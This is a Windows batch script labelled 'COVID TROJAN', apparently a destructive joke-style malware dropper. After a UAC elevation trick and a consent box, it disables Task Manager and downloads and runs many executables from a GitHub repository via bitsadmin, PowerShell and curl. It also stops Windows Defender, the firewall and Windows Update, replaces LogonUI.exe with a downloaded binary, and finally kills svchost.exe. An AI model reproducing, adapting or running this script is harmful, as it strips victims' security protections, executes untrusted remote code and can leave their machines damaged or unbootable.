@echo off
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"

if exist "%temp%\yes.txt" goto yes

:no
del /f /q "%temp%\yes.txt"
del /f /q "%temp%\ques.vbs"
(
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo X = Msgbox^("This Trojan will destroy your computer!! continue?", vbQuestion + vbYesNo + 4096, "COVID TROJAN"^)
echo If X=vbYes then
echo Set txtFile = fso.CreateTextFile^("%temp%\yes.txt", true^)
echo Set UAC = CreateObject^("Shell.Application"^)
echo UAC.ShellExecute "%~s0", "", "", "runas", 0

echo ELSEIf X=vbNo then

echo End If
) > "%temp%\ques.vbs"
start "" "%temp%\ques.vbs"
exit

:yes
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
md C:\file
cd C:\file
md files
md musics

cd C:\file\musics
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/1.wav "C:\file\musics\1.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/2.wav "C:\file\musics\2.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/3.wav "C:\file\musics\3.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/4.wav "C:\file\musics\4.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/B.wav "C:\file\musics\B.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/funny.wav "C:\file\musics\funny.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/glitch.wav "C:\file\musics\glitch.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/brokentv.wav "C:\file\musics\brokentv.wav"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/dizziness.mp3 "C:\file\musics\dizziness.mp3"

cd C:\file\files
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/OVERWRITE/raw/main/overwrite.exe "C:\file\files\overwrite.exe
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/fcker.exe "C:\file\files\fcker.exe
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/ErrorCursor64.exe "C:\file\files\ErrorCursor64.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/Invert64.exe "C:\file\files\Invert64.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/locker.exe "C:\file\files\locker.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/ShakeCursor64.exe "C:\file\files\ShakeCursor64.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/blur.exe "C:\file\files\blur.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/coronaimg.exe "C:\file\files\coronaimg.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/roating.exe "C:\file\files\roating.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/copy.exe "C:\file\files\copy.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/rainbow.exe "C:\file\files\rainbow.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/blackandwhite.exe "C:\file\files\blackandwhite.exe"
bitsadmin.exe /transfer "Covid File Download" https://github.com/BAtchfiler0/Covid/raw/main/nircmd.exe "C:\file\files\nircmd.exe"

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/circles.exe','C:\file\files\circles.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/cubes.exe','C:\file\files\cubes.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/rgbquad.exe','C:\file\files\rgbquad.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/shake.exe','C:\file\files\shake.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/mythlasathame.exe','C:\file\files\mythlasathame.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/mythlasshander.exe','C:\file\files\mythlasshander.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/wef.exe','C:\file\files\wef.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/waves.exe','C:\file\files\waves.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/Covid/raw/main/chroma.exe','C:\file\files\chroma.exe')"

curl https://raw.githubusercontent.com/BAtchfiler0/Covid/main/song.vbs > "C:\file\files\song.vbs"
curl https://raw.githubusercontent.com/BAtchfiler0/Covid/main/song1.vbs > "C:\file\files\song1.vbs"

md C:\files
bitsadmin.exe /transfer "Covid File Download" https://raw.githubusercontent.com/BAtchfiler0/Covid/main/covoid.png "C:\files\covid.png"

RUNDLL32 USER32.DLL,SwapMouseButton

net stop "SDRSVC"
net stop "WinDefend"

taskkill /f /t /im "MSASCui.exe"

net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"

takeown /f C:\Windows\System32\LogonUI.exe
icacls C:\Windows\System32\LogonUI.exe /grant everyone:f
copy C:\file\files\fcker.exe C:\Windows\System32\LogonUI.exe /Y
start blur.exe
start nircmd mediaplay 13000 "c:\file\musics\dizziness.mp3"
timeout /t 13
taskkill /f /im blur.exe
start blackandwhite.exe
nircmd beep 2000 2000
timeout /t 3
start nircmd mediaplay 20000 "c:\file\musics\4.wav"
start song.vbs
start invert64.exe
start shakecursor64.exe
start ErrorCursor64.exe
timeout /t 20
taskkill /f /im copy.exe
taskkill /f /im errorcursor64.exe
taskkill /f /im invert64.exe
start coronaimg.exe
start song1.vbs
taskkill /f /im explorer.exe
start nircmd mediaplay 20000 "c:\file\musics\3.wav"
timeout /t 20
start explorer.exe
taskkill /f /im coronaimg.exe
taskkill /f /im roating.exe
taskkill /f /im shakecursor64.exe
(
echo Dim msg, sapi
echo Set sapi = createObject^("sapi.spvoice"^)
echo Set sapi.Voice = sapi.GetVoices.Item^(1^)
echo.
echo sapi.Speak "covoid-19"
) > voice.vbs


echo msgbox "you are rotting now",16+4096,"Covid-19" > covidmsg.vbs

start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1
start covidmsg.vbs
start voice.vbs
timeout 1

taskkill /f /im wscript.exe

start blackandwhite.exe
nircmd beep 2000 2000
timeout /t 3
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\rainbow.exe" ^& Chr^(34^), 0
) > song2.vbs
start song2.vbs
start nircmd mediaplay 20000 "c:\file\musics\2.wav"
timeout /t 10
start song.vbs
timeout /t 10
taskkill /f /im rainbow.exe
taskkill /f /im copy.exe
start blackandwhite.exe
timeout /t 4
taskkill /f /im explorer.exe

(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\circles.exe" ^& Chr^(34^), 0
) > starter.vbs

(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\wef.exe" ^& Chr^(34^), 0
) > starter1.vbs

start starter.vbs
start starter1.vbs
start nircmd mediaplay 20000 "C:\file\musics\funny.wav"
timeout /t 20
taskkill /f /im wef.exe
taskkill /f /im circles.exe

(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\cubes.exe" ^& Chr^(34^), 0
) > starter2.vbs
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\shake.exe" ^& Chr^(34^), 0
) > starter3.vbs
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\mythlasshander.exe" ^& Chr^(34^), 0
) > starter4.vbs
start starter2.vbs
start starter3.vbs
start starter4.vbs
start nircmd mediaplay 20000 "C:\file\musics\1.wav"
timeout /t 20
taskkill /f /im cubes.exe
taskkill /f /im shake.exe
taskkill /f /im mythlasshander.exe

(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\mythlasathame.exe" ^& Chr^(34^), 0
) > starter5.vbs
start starter5.vbs
start nircmd mediaplay 20000 "C:\file\musics\B.wav"
timeout /t 20
taskkill /f /im mythlasathame.exe
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\waves.exe" ^& Chr^(34^), 0
) > starter6.vbs
start nircmd mediaplay 20000 "C:\file\musics\glitch.wav"
timeout /t 20
taskkill /f /im waves.exe
taskkill /f /im explorer.exe
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "C:\file\files\chroma.exe" ^& Chr^(34^), 0
) > starter7.vbs
start starter7.vbs
start nircmd mediaplay 20000 "C:\file\musics\brokentv.wav"
timeout /t 20
taskkill /f /im svchost.exe
exit